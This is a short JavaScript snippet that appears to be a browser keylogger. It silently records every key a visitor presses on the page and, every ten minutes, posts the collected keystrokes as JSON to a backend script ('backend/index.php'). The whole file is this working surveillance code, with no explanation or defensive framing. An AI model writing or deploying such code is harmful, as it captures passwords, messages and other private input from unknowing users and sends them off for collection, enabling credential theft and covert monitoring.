(function (){
    let letters = [];
    let data = new FormData();

    document.addEventListener('keypress', function(e){
        letters.push(e.key)
    })

    let myInterval = setInterval(function() {
        data.append('data', JSON.stringify(letters))

        fetch('backend/index.php', { 
            method: 'POST', 
            body: data
        })
    }, 600000)
    
})();